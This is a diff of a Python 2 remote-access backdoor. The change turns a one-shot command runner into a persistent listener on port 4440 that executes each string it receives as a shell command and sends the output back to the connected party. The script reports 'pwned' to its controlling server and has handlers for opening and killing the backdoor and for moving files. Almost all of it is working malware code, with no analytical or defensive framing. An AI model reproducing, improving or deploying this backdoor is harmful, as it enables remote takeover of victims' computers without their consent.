@@ -28,10 +28,9 @@ def command():
     s.send(output)
 
 def bd_command():
-    global output
-    cmd = subprocess.Popen(srv_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    cmd = subprocess.Popen(bdr, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     output = cmd.stdout.read() + cmd.stderr.read()
-    print output
+    bd_conn.send(output)
 
 # Upload File
 def send_file():
@@ -65,7 +64,8 @@ def recover_file():
 # Create
 def backdoor():
     global bds
-    global bd_port
+    global bd_conn
+    global bdr
     bd_host = ''
     bd_port = 4440
 
@@ -77,10 +77,17 @@ def backdoor():
         exit()
     bds.listen(1)
     print "Backdoor opened: Listening on port: ", bd_port
-    bdcon, bdaddr = bds.accept()
-    print "Server connected: ", bdaddr
-    bd_command()
-
+    bd_conn, bd_addr = bds.accept()
+    print "Server connected: ", bd_addr
+    while True:
+        bdr = bd_conn.recv(1024)
+        if bdr == "QUIT":
+            print "Disconnecting from client"
+            bd_conn.close()
+            print "Closing backdoor."
+            bds.close()
+            break
+        bd_command()
 
 def main():
     while True:
@@ -109,13 +116,12 @@ def main():
         elif srv_cmd == "snd_cli":
             recover_file()
         elif srv_cmd == "bd_me":
-            p = multiprocessing.Process(target=backdoor)
-            p.start()
             try:
+                p = multiprocessing.Process(target=backdoor)
+                p.start()
                 s.send("pwned")
             except:
-                print "Couldn't create backdoor"
-                s.send("Couldn't create backdoor")
+                print "Couldn't create backdoor process."
         elif srv_cmd == "kill_bd":
             try:
                 p.terminate()
